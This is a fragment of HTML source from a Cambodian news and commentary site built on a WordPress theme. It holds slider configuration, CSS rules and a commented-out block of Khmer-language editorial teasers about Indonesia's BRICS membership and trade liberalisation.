        block_tdi_44.atts = '{"image_size":"td_1068x0","meta_info_vert":"content-vert-bottom","nav_icon_size":"eyJhbGwiOiIzMCIsInBvcnRyYWl0IjoiMzgifQ==","color_overlay":"eyJ0eXBlIjoiZ3JhZGllbnQiLCJjb2xvcjEiOiJyZ2JhKDI1NSwyNTUsMjU1LDApIiwiY29sb3IyIjoicmdiYSgyMjEsNTEsNTEsMC44KSIsIm1peGVkQ29sb3JzIjpbeyJjb2xvciI6InJnYmEoMCwwLDAsMCkiLCJwZXJjZW50YWdlIjo1MH1dLCJjc3MiOiJiYWNrZ3JvdW5kOiAtd2Via2l0LWxpbmVhci1ncmFkaWVudCgwZGVnLHJnYmEoMjIxLDUxLDUxLDAuOCkscmdiYSgwLDAsMCwwKSA1MCUscmdiYSgyNTUsMjU1LDI1NSwwKSk7YmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDBkZWcscmdiYSgyMjEsNTEsNTEsMC44KSxyZ2JhKDAsMCwwLDApIDUwJSxyZ2JhKDI1NSwyNTUsMjU1LDApKTsiLCJjc3NQYXJhbXMiOiIwZGVnLHJnYmEoMjIxLDUxLDUxLDAuOCkscmdiYSgwLDAsMCwwKSA1MCUscmdiYSgyNTUsMjU1LDI1NSwwKSJ9","image_height":"eyJhbGwiOiI0MjAiLCJwaG9uZSI6IjE5MCIsImxhbmRzY2FwZSI6IjM4NSIsInBvcnRyYWl0IjoiMzY1In0=","show_author":"eyJwaG9uZSI6Im5vbmUiLCJhbGwiOiJub25lIn0=","show_com":"none","msf_title_font_size":"eyJhbGwiOiIyMiIsInBob25lIjoiMTUifQ==","meta_info_horiz":"content-horiz-center","el_class":"slide-style-2","image_alignment":"eyJhbGwiOiIzNSIsInBvcnRyYWl0IjoiNDAiLCJwaG9uZSI6IjMwIn0=","tdc_css":"eyJhbGwiOnsiZGlzcGxheSI6IiJ9LCJwaG9uZSI6eyJtYXJnaW4tYm90dG9tIjoiMTAiLCJkaXNwbGF5IjoiIn0sInBob25lX21heF93aWR0aCI6NzY3fQ==","prev_tdicon":"tdc-font-tdmp tdc-font-tdmp-arrow-left","next_tdicon":"tdc-font-tdmp tdc-font-tdmp-arrow-right","meta_padding":"15px 40px","art_title_space":"10px 0px","cat_bg":"#bb0000","cat_bg_hover":"#bb0000","category_radius":"12","msf_meta_font_weight":"500","msf_meta_font_transform":"uppercase","show_date":"eyJwaG9uZSI6Im5vbmUifQ==","msf_title_font_line_height":"eyJsYW5kc2NhcGUiOiIxLjYiLCJhbGwiOiIxLjYifQ==","msf_meta_font_family":"file_1","autoplay":"3","msf_title_font_family":"432","msf_cat_font_family":"file_1","block_type":"td_block_slide","separator":"","custom_title":"","custom_url":"","block_template_id":"","title_tag":"","ms_title_tag":"","post_ids":"","category_id":"","taxonomies":"","category_ids":"","in_all_terms":"","tag_slug":"","autors_id":"","installed_post_types":"","include_cf_posts":"","exclude_cf_posts":"","sort":"","linked_posts":"","favourite_only":"","limit":"5","offset":"","open_in_new_window":"","show_modified_date":"","time_ago":"","time_ago_add_txt":"ago","time_ago_txt_pos":"","review_source":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","td_ajax_preloading":"","content_width":"","category_margin":"","category_padding":"","show_cat":"inline-block","f_header_font_header":"","f_header_font_title":"Block header","f_header_font_settings":"","f_header_font_family":"","f_header_font_size":"","f_header_font_line_height":"","f_header_font_style":"","f_header_font_weight":"","f_header_font_transform":"","f_header_font_spacing":"","f_header_":"","f_ajax_font_title":"Ajax categories","f_ajax_font_settings":"","f_ajax_font_family":"","f_ajax_font_size":"","f_ajax_font_line_height":"","f_ajax_font_style":"","f_ajax_font_weight":"","f_ajax_font_transform":"","f_ajax_font_spacing":"","f_ajax_":"","msf_title_font_header":"","msf_title_font_title":"Article title","msf_title_font_settings":"","msf_title_font_style":"","msf_title_font_weight":"","msf_title_font_transform":"","msf_title_font_spacing":"","msf_title_":"","msf_cat_font_title":"Article category tag","msf_cat_font_settings":"","msf_cat_font_size":"","msf_cat_font_line_height":"","msf_cat_font_style":"","msf_cat_font_weight":"","msf_cat_font_transform":"","msf_cat_font_spacing":"","msf_cat_":"","msf_meta_font_title":"Article meta info","msf_meta_font_settings":"","msf_meta_font_size":"","msf_meta_font_line_height":"","msf_meta_font_style":"","msf_meta_font_spacing":"","msf_meta_":"","mix_color":"","mix_type":"","fe_brightness":"1","fe_contrast":"1","fe_saturate":"1","mix_color_h":"","mix_type_h":"","fe_brightness_h":"1","fe_contrast_h":"1","fe_saturate_h":"1","color_overlay_h":"","title_color":"","cat_txt":"","cat_txt_hover":"","author_txt":"","author_txt_hover":"","date_txt":"","comm_txt":"","review_stars":"","nav_icons_color":"","css":"","td_column_number":1,"header_color":"","ajax_pagination_infinite_stop":"","color_preset":"","ajax_pagination":"","ajax_pagination_next_prev_swipe":"","border_top":"","class":"tdi_44","tdc_css_class":"tdi_44","tdc_css_class_style":"tdi_44_rand_style"}';
        block_tdi_44.td_column_number = "1";
        block_tdi_44.block_type = "td_block_slide";
        block_tdi_44.post_count = "5";
        block_tdi_44.found_posts = "362";
        block_tdi_44.header_color = "";
        block_tdi_44.ajax_pagination_infinite_stop = "";
        block_tdi_44.max_num_pages = "73";
        tdBlocksArray.push(block_tdi_44);
    </script>
    <style scoped="">
        .tdi_43 {
            vertical-align: baseline
        }

        .tdi_43>.wpb_wrapper,
        .tdi_43>.wpb_wrapper>.tdc-elements {
            display: block
        }

        .tdi_43>.wpb_wrapper>.tdc-elements {
            width: 100%
        }

        .tdi_43>.wpb_wrapper>.vc_row_inner {
            width: auto
        }

        .tdi_43>.wpb_wrapper {
            width: auto;
            height: auto
        }
    </style>
    <style scoped="">
        .tdi_41,
        .tdi_41 .tdc-columns {
            min-height: 0
        }

        .tdi_41,
        .tdi_41 .tdc-columns {
            display: block
        }

        .tdi_41 .tdc-columns {
            width: 100%
        }

        @media (min-width:768px) {
            .tdi_41 {
                margin-left: -15px;
                margin-right: -15px
            }

            .tdi_41 .tdc-row-video-background-error,
            .tdi_41>.vc_column,
            .tdi_41>.tdc-columns>.vc_column {
                padding-left: 15px;
                padding-right: 15px
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            @media (min-width:768px) {
                .tdi_41 {
                    margin-left: -8px;
                    margin-right: -8px
                }

                .tdi_41 .tdc-row-video-background-error,
                .tdi_41>.vc_column,
                .tdi_41>.tdc-columns>.vc_column {
                    padding-left: 8px;
                    padding-right: 8px
                }
            }
        }
    </style>
    <style scoped="">
        .tdi_37 {
            vertical-align: baseline
        }

        .tdi_37>.wpb_wrapper,
        .tdi_37>.wpb_wrapper>.tdc-elements {
            display: block
        }

        .tdi_37>.wpb_wrapper>.tdc-elements {
            width: 100%
        }

        .tdi_37>.wpb_wrapper>.vc_row_inner {
            width: auto
        }

        .tdi_37>.wpb_wrapper {
            width: auto;
            height: auto
        }
    </style>
    <style scoped="">
        .tdi_35,
        .tdi_35 .tdc-columns {
            min-height: 0
        }

        .tdi_35,
        .tdi_35 .tdc-columns {
            display: block
        }

        .tdi_35 .tdc-columns {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_33 {
            min-height: 0
        }
    </style>



</body>

</html>
<!-- <div class="td_module_flex td_module_flex_1 td_module_wrap td-animation-stack td-cpt-post">
                                                                    <div class="td-module-container td-category-pos-">
                                                                        <div class="td-image-container">
                                                                            <div class="td-module-thumb"><a href="https://www.theseedcambodia.com/article/9183/" rel="bookmark" class="td-image-wrap " title="កម្មវិធីវិចារណកថាថ្ងៃសុក្រ៖ ការចូលរួមរបស់ឥណ្ឌូនេស៊ីជាសមាជិក BRICS និងការសម្លឹងចូលរួមពីសមាជិកអាស៊ានមួយចំនួន"><span class="entry-thumb td-thumb-css td-animation-stack-type1-1" data-type="css_image" data-img-url="https://www.theseedcambodia.com/wp-content/uploads/2025/02/website-cover-18-696x392.png"></span></a></div>
                                                                        </div>

                                                                        <div class="td-module-meta-info">

                                                                            <h3 class="entry-title td-module-title"><a href="https://www.theseedcambodia.com/article/9183/" rel="bookmark" title="កម្មវិធីវិចារណកថាថ្ងៃសុក្រ៖ ការចូលរួមរបស់ឥណ្ឌូនេស៊ីជាសមាជិក BRICS និងការសម្លឹងចូលរួមពីសមាជិកអាស៊ានមួយចំនួន">កម្មវិធីវិចារណកថាថ្ងៃសុក្រ៖ ការចូលរួមរបស់ឥណ្ឌូនេស៊ីជាសមាជិក BRICS និងការសម្លឹងចូលរួមពីសមាជិកអាស៊ានមួយចំនួន</a></h3>


                                                                            <div class="td-excerpt">នៅដើមឆ្នាំ២០២៥ BRICS បានកើនសមាជិកចំនួន ១០ ប្រទេសបន្ទាប់ប្រទេសប្រេស៊ីលដែលជាម្ចាស់ផ្ទះក្នុងឆ្នាំនេះបានប្រកាសពីការស្វាគមន៍ទី១០ របស់ខ្លួន។ ហើយសមាជិកទី១០ នោះគឺប្រទេសឥណ្ឌូនេស៊ី ដែលជាប្រទេសដ៏ធំមួយនៅតំបន់អាស៊ានរួមទាំងពិភពលោកដែលមានប្រជាជនលេខរៀងទី៤ និងសេដ្ឋកិច្ចខ្លាំងស្ថិតក្នុង២០ប្រទេសផងដែរ។ ក្នុងនោះ សមាជិកអាស៊ានមួយចំនួនទៀតក៏មានទំនាក់ទំនងនឹង BRICS ដូចជាប្រទេសថៃ ម៉ាឡេស៊ី និងវៀតណាម។ ថៃ និងម៉ាឡេស៊ី បានក្លាយជាប្រទេសដៃគូជាមួយBRICS ហើយវៀតណាមនៅមិនទាន់បានក្លាយជាប្រទេសដៃគូនៅឡើយទេ ប៉ុន្តែគេរំពឹងថាវៀតណាមនឹងក្លាយជាប្រទេសដៃគូនៅក្នុងឆ្នាំនេះ ដោយសារតែនាយករដ្ឋមន្ត្រីវៀតណាម លោក ផាំ...</div>

                                                                        </div>
                                                                    </div>
                                                                </div>


                                                                <div class="td_module_flex td_module_flex_1 td_module_wrap td-animation-stack td-cpt-post">
                                                                    <div class="td-module-container td-category-pos-">
                                                                        <div class="td-image-container">
                                                                            <div class="td-module-thumb"><a href="https://www.theseedcambodia.com/article/9171/" rel="bookmark" class="td-image-wrap " title="វិចារណកថាថ្ងៃសុក្រ៖ អត្ថប្រយោជន៍នៃសេរីភាវូបនីយកម្មពាណិជ្ជកម្ម"><span class="entry-thumb td-thumb-css td-animation-stack-type1-1" data-type="css_image" data-img-url="https://www.theseedcambodia.com/wp-content/uploads/2025/01/website-cover-1-696x392.png"></span></a></div>
                                                                        </div>

                                                                        <div class="td-module-meta-info">

                                                                            <h3 class="entry-title td-module-title"><a href="https://www.theseedcambodia.com/article/9171/" rel="bookmark" title="វិចារណកថាថ្ងៃសុក្រ៖ អត្ថប្រយោជន៍នៃសេរីភាវូបនីយកម្មពាណិជ្ជកម្ម">វិចារណកថាថ្ងៃសុក្រ៖ អត្ថប្រយោជន៍នៃសេរីភាវូបនីយកម្មពាណិជ្ជកម្ម</a></h3>


                                                                            <div class="td-excerpt">១. មូលដ្ឋានគ្រឹះនៃសេរីភាវូបនីយកម្មពាណិជ្ជកម្មសម័យបច្ចុប្បន្ន
                                                                                សេរីភាវូបនីយកម្មពាណិជ្ជកម្មសេរីសំដៅលើដំណើរការនៃការកាត់បន្ថយ ឬលុបបំបាត់របាំងពាណិជ្ជកម្ម ដូចជាពន្ធគយ កូតា និងការរឹតបន្តឹងការនាំចូល ដើម្បីលើកទឹកចិត្តដល់លំហូរសេរីនៃទំនិញ និងសេវាកម្មឆ្លងកាត់ព្រំដែន។ គោលដៅគឺដើម្បីបង្កើតទីផ្សារពិភពលោកដែលបើកចំហ និងប្រកួតប្រជែងជាងមុន ដែលអាជីវកម្ម និងអ្នកប្រើប្រាស់អាចទទួលបានអត្ថប្រយោជន៍ពីឱកាសពាណិជ្ជកម្មកើនឡើង។
                                                                                គេសង្កេតឃើញថា ក្រោយសង្គ្រាមលោកលើកទី២ សហរដ្ឋអាមេរិក និងប្រទេសសម្ព័ន្ធមិត្តបានចុះហត្ថលេខា និងរួមគ្នាបង្កើត ប្រព័ន្ធប្រ៊ីដតុនវូដ (Bretton Woods System) ដែលមានស្ថាប័នដូចជា មូលនិធិហិរញ្ញវត្ថុអន្តរជាតិ (IMF) និង...</div>

                                                                        </div>
                                                                    </div>
                                                                </div> -->